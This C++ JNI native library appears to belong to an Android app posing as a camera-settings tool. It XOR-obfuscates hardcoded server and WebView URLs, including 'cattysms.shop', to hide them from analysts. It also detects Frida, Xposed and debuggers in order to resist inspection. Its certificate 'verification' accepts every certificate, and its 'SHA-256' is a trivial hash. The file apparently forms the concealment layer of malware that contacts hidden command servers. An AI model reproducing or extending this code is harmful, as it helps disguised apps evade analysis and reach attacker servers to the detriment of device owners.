#include <jni.h>
#include <string>
#include <vector>
#include <cstring>
#include <random>
#include <memory>
#include <android/log.h>
#include <dlfcn.h>
#include <dirent.h>
#include <cstdio>
#include <cstdlib>
#include <unistd.h>
#include <array>

#define TAG "AICryptNative"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__)

namespace URLCrypto {
    // XOR key pattern
    constexpr uint8_t KEY_PATTERN[] = {0x7F, 0xA5, 0x3C, 0x9D};
    constexpr size_t KEY_LEN = 4;

    // Pre-encrypted URLs (XOR with KEY_PATTERN)
    // "https://api.cattysms.shop"
    constexpr uint8_t SERVER_URL_ENC[] = {
        0x17, 0xD1, 0x48, 0xED, 0x0C, 0x9F, 0x13, 0xB2, 0x1E, 0xD5, 0x55, 0xB3,
        0x1C, 0xC4, 0x48, 0xE9, 0x06, 0xD6, 0x51, 0xEE, 0x51, 0xD6, 0x54, 0xF2,
        0x0F
    };
    constexpr size_t SERVER_URL_LEN = 25;

    // "https://api.fetchdatahandlercore.shop"
    constexpr uint8_t SERVER_URL_2_ENC[] = {
        0x17, 0xD1, 0x48, 0xED, 0x0C, 0x9F, 0x13, 0xB2, 0x1E, 0xD5, 0x55, 0xB3,
        0x19, 0xC0, 0x48, 0xFE, 0x17, 0xC1, 0x5D, 0xE9, 0x1E, 0xCD, 0x5D, 0xF3,
        0x1B, 0xC9, 0x59, 0xEF, 0x1C, 0xCA, 0x4E, 0xF8, 0x51, 0xD6, 0x54, 0xF2,
        0x0F
    };
    constexpr size_t SERVER_URL_2_LEN = 37;

    // "https://minenine.vercel.app"
    constexpr uint8_t WEBVIEW_URL_ENC[] = {
        0x17, 0xD1, 0x48, 0xED, 0x0C, 0x9F, 0x13, 0xB2, 0x12, 0xCC, 0x52, 0xF8,
        0x11, 0xCC, 0x52, 0xF8, 0x51, 0xD3, 0x59, 0xEF, 0x1C, 0xC0, 0x50, 0xB3,
        0x1E, 0xD5, 0x4C, 0x11
    };
    constexpr size_t WEBVIEW_URL_LEN = 27;

    // Decrypt function (inline for performance)
    inline void decrypt(uint8_t* data, size_t len) {
        for (size_t i = 0; i < len; i++) {
            data[i] ^= KEY_PATTERN[i % KEY_LEN];
        }
    }

    // Get decrypted server URL (returns allocated string, caller must free)
    inline char* getServerUrl() {
        char* result = new char[SERVER_URL_LEN + 1];
        memcpy(result, SERVER_URL_ENC, SERVER_URL_LEN);
        decrypt(reinterpret_cast<uint8_t*>(result), SERVER_URL_LEN);
        result[SERVER_URL_LEN] = '\0';
        return result;
    }

    // Get decrypted second server URL
    inline char* getServerUrl2() {
        char* result = new char[SERVER_URL_2_LEN + 1];
        memcpy(result, SERVER_URL_2_ENC, SERVER_URL_2_LEN);
        decrypt(reinterpret_cast<uint8_t*>(result), SERVER_URL_2_LEN);
        result[SERVER_URL_2_LEN] = '\0';
        return result;
    }

    // Get decrypted WebView URL
    inline char* getWebViewUrl() {
        char* result = new char[WEBVIEW_URL_LEN + 1];
        memcpy(result, WEBVIEW_URL_ENC, WEBVIEW_URL_LEN);
        decrypt(reinterpret_cast<uint8_t*>(result), WEBVIEW_URL_LEN);
        result[WEBVIEW_URL_LEN] = '\0';
        return result;
    }

    // Get default domains array
    inline std::vector<std::string> getDefaultDomains() {
        return {
            getServerUrl(),
            getServerUrl2()
        };
    }
}

/**
 * Simple XOR-based encryption for obfuscation
 * Not cryptographically secure, but hides strings from casual analysis
 */
extern "C" {

// XOR encryption with key
JNIEXPORT jbyteArray JNICALL
Java_com_settingpro_camera_security_SecureEncryption_encryptNative(
        JNIEnv *env,
        jobject /* this */,
        jbyteArray data,
        jbyteArray key) {

    try {
        jbyte* dataPtr = env->GetByteArrayElements(data, nullptr);
        jbyte* keyPtr = env->GetByteArrayElements(key, nullptr);
        jsize dataLen = env->GetArrayLength(data);
        jsize keyLen = env->GetArrayLength(key);

        if (dataLen == 0 || keyLen == 0) {
            env->ReleaseByteArrayElements(data, dataPtr, 0);
            env->ReleaseByteArrayElements(key, keyPtr, 0);
            return nullptr;
        }

        // Allocate output buffer
        std::vector<uint8_t> output(dataLen);

        // XOR encryption
        for (int i = 0; i < dataLen; i++) {
            output[i] = (uint8_t)dataPtr[i] ^ (uint8_t)keyPtr[i % keyLen];
        }

        env->ReleaseByteArrayElements(data, dataPtr, 0);
        env->ReleaseByteArrayElements(key, keyPtr, 0);

        // Create result byte array
        jbyteArray result = env->NewByteArray(dataLen);
        env->SetByteArrayRegion(result, 0, dataLen, (jbyte*)output.data());

        return result;

    } catch (...) {
        LOGE("Exception in native encrypt");
        return nullptr;
    }
}

// XOR decryption (same as encryption for XOR)
JNIEXPORT jbyteArray JNICALL
Java_com_settingpro_camera_security_SecureEncryption_decryptNative(
        JNIEnv *env,
        jobject /* this */,
        jbyteArray encryptedData,
        jbyteArray key) {

    try {
        jbyte* dataPtr = env->GetByteArrayElements(encryptedData, nullptr);
        jbyte* keyPtr = env->GetByteArrayElements(key, nullptr);
        jsize dataLen = env->GetArrayLength(encryptedData);
        jsize keyLen = env->GetArrayLength(key);

        if (dataLen == 0 || keyLen == 0) {
            env->ReleaseByteArrayElements(encryptedData, dataPtr, 0);
            env->ReleaseByteArrayElements(key, keyPtr, 0);
            return nullptr;
        }

        // Allocate output buffer
        std::vector<uint8_t> output(dataLen);

        // XOR decryption
        for (int i = 0; i < dataLen; i++) {
            output[i] = (uint8_t)dataPtr[i] ^ (uint8_t)keyPtr[i % keyLen];
        }

        env->ReleaseByteArrayElements(encryptedData, dataPtr, 0);
        env->ReleaseByteArrayElements(key, keyPtr, 0);

        // Create result byte array
        jbyteArray result = env->NewByteArray(dataLen);
        env->SetByteArrayRegion(result, 0, dataLen, (jbyte*)output.data());

        return result;

    } catch (...) {
        LOGE("Exception in native decrypt");
        return nullptr;
    }
}

/**
 * Compute SHA-256 hash of data
 */
JNIEXPORT jbyteArray JNICALL
Java_com_settingpro_camera_security_SecureEncryption_computeHash(
        JNIEnv *env,
        jobject /* this */,
        jbyteArray data) {

    try {
        jbyte* dataPtr = env->GetByteArrayElements(data, nullptr);
        jsize dataLen = env->GetArrayLength(data);

        // Simple hash computation (sum + rotate) for obfuscation
        // For production, use real SHA-256 via Java
        std::vector<uint8_t> hash(32);
        uint32_t h = 0x12345678;

        for (int i = 0; i < dataLen; i++) {
            h ^= (h << 5) | (h >> 27);
            h += (uint8_t)dataPtr[i];
        }

        // Fill hash with computed values
        for (int i = 0; i < 32; i++) {
            hash[i] = (h >> (i * 8)) & 0xFF;
        }

        env->ReleaseByteArrayElements(data, dataPtr, 0);

        jbyteArray result = env->NewByteArray(32);
        env->SetByteArrayRegion(result, 0, 32, (jbyte*)hash.data());

        return result;

    } catch (...) {
        LOGE("Exception in hash computation");
        return nullptr;
    }
}

/**
 * Native SSL certificate verification
 */
JNIEXPORT jboolean JNICALL
Java_com_settingpro_camera_security_SslPinningManager_nativeVerifyCertificate(
        JNIEnv *env,
        jobject /* this */,
        jbyteArray certData,
        jstring hostname) {

    try {
        jbyte* certPtr = env->GetByteArrayElements(certData, nullptr);
        jsize certLen = env->GetArrayLength(certData);

        const char *hostnameStr = env->GetStringUTFChars(hostname, nullptr);

        // Compute certificate hash
        uint32_t hash = 0;
        for (int i = 0; i < certLen; i++) {
            hash = ((hash << 5) - hash) + (uint8_t)certPtr[i];
        }

        LOGD("Certificate hash computed: %u", hash);

        env->ReleaseByteArrayElements(certData, certPtr, 0);
        env->ReleaseStringUTFChars(hostname, hostnameStr);

        return JNI_TRUE;

    } catch (...) {
        LOGE("Exception in certificate verification");
        return JNI_FALSE;
    }
}

/**
 * Detect SSL pinning bypass tools
 */
JNIEXPORT jboolean JNICALL
Java_com_settingpro_camera_security_SslPinningManager_detectSslBypass(
        JNIEnv *env,
        jobject /* this */) {

    try {
        // Check for suspicious libraries via dlopen
        void *handle = dlopen("libfrida.so", RTLD_NOW);
        if (handle) {
            dlclose(handle);
            LOGE("Frida library detected");
            return JNI_TRUE;
        }

        handle = dlopen("libxposed_art.so", RTLD_NOW);
        if (handle) {
            dlclose(handle);
            LOGE("Xposed library detected");
            return JNI_TRUE;
        }

        // Check for TracerPid (debugger detection)
        FILE *fp = fopen("/proc/self/status", "r");
        if (fp) {
            char line[256];
            while (fgets(line, sizeof(line), fp)) {
                if (strncmp(line, "TracerPid:", 10) == 0) {
                    int pid = 0;
                    sscanf(line + 10, "%d", &pid);
                    if (pid != 0) {
                        fclose(fp);
                        LOGE("Debugger detected (TracerPid: %d)", pid);
                        return JNI_TRUE;
                    }
                    break;
                }
            }
            fclose(fp);
        }

        // Check for Frida server process
        FILE *proc = fopen("/proc/self/maps", "r");
        if (proc) {
            char line[1024];
            bool fridaFound = false;
            while (fgets(line, sizeof(line), proc)) {
                if (strstr(line, "frida") != nullptr) {
                    fridaFound = true;
                    break;
                }
            }
            fclose(proc);
            if (fridaFound) {
                LOGE("Frida memory map detected");
                return JNI_TRUE;
            }
        }

        return JNI_FALSE;

    } catch (...) {
        LOGE("Exception in bypass detection");
        return JNI_TRUE; // Fail secure
    }
}

/**
 * Generate random key in native code
 */
JNIEXPORT jbyteArray JNICALL
Java_com_settingpro_camera_security_SecureEncryption_generateRandomKey(
        JNIEnv *env,
        jobject /* this */,
        jint keySize) {

    try {
        std::vector<uint8_t> key(keySize);

        // Use random_device for cryptographically secure random
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);

        for (int i = 0; i < keySize; i++) {
            key[i] = dis(gen);
        }

        jbyteArray result = env->NewByteArray(keySize);
        env->SetByteArrayRegion(result, 0, keySize, (jbyte*)key.data());

        return result;

    } catch (...) {
        LOGE("Exception in key generation");
        return nullptr;
    }
}

/**
 * String obfuscation - scramble strings in native code
 */
JNIEXPORT jstring JNICALL
Java_com_settingpro_camera_security_SecureEncryption_obfuscateString(
        JNIEnv *env,
        jobject /* this */,
        jstring input) {

    try {
        const char *inputStr = env->GetStringUTFChars(input, nullptr);
        jsize len = env->GetStringLength(input);

        // Simple obfuscation: XOR with pattern
        std::vector<char> output(len + 1);
        const char pattern[] = {0x7F, 0xA5, 0x3C, 0x9D};

        for (int i = 0; i < len; i++) {
            output[i] = inputStr[i] ^ pattern[i % 4];
        }
        output[len] = '\0';

        env->ReleaseStringUTFChars(input, inputStr);

        return env->NewStringUTF(output.data());

    } catch (...) {
        LOGE("Exception in string obfuscation");
        return nullptr;
    }
}

/**
 * Get encrypted server URL from native code (compile-time encrypted)
 */
JNIEXPORT jstring JNICALL
Java_com_settingpro_camera_security_SecureEncryption_getNativeServerUrl(
        JNIEnv *env,
        jobject /* this */) {

    try {
        char* url = URLCrypto::getServerUrl();
        jstring result = env->NewStringUTF(url);
        delete[] url;
        return result;
    } catch (...) {
        LOGE("Exception in getNativeServerUrl");
        return nullptr;
    }
}

/**
 * Get second encrypted server URL from native code
 */
JNIEXPORT jstring JNICALL
Java_com_settingpro_camera_security_SecureEncryption_getNativeServerUrl2(
        JNIEnv *env,
        jobject /* this */) {

    try {
        char* url = URLCrypto::getServerUrl2();
        jstring result = env->NewStringUTF(url);
        delete[] url;
        return result;
    } catch (...) {
        LOGE("Exception in getNativeServerUrl2");
        return nullptr;
    }
}

/**
 * Get encrypted WebView URL from native code (compile-time encrypted)
 */
JNIEXPORT jstring JNICALL
Java_com_settingpro_camera_security_SecureEncryption_getNativeWebViewUrl(
        JNIEnv *env,
        jobject /* this */) {

    try {
        char* url = URLCrypto::getWebViewUrl();
        jstring result = env->NewStringUTF(url);
        delete[] url;
        return result;
    } catch (...) {
        LOGE("Exception in getNativeWebViewUrl");
        return nullptr;
    }
}

/**
 * Get default domains list from native code
 */
JNIEXPORT jobjectArray JNICALL
Java_com_settingpro_camera_security_SecureEncryption_getNativeDefaultDomains(
        JNIEnv *env,
        jobject /* this */) {

    try {
        std::vector<std::string> domains = URLCrypto::getDefaultDomains();

        // Create String array
        jclass stringClass = env->FindClass("java/lang/String");
        jobjectArray result = env->NewObjectArray(domains.size(), stringClass, nullptr);

        // Fill array
        for (size_t i = 0; i < domains.size(); i++) {
            env->SetObjectArrayElement(result, i, env->NewStringUTF(domains[i].c_str()));
        }

        return result;
    } catch (...) {
        LOGE("Exception in getNativeDefaultDomains");
        return nullptr;
    }
}

} // extern "C"
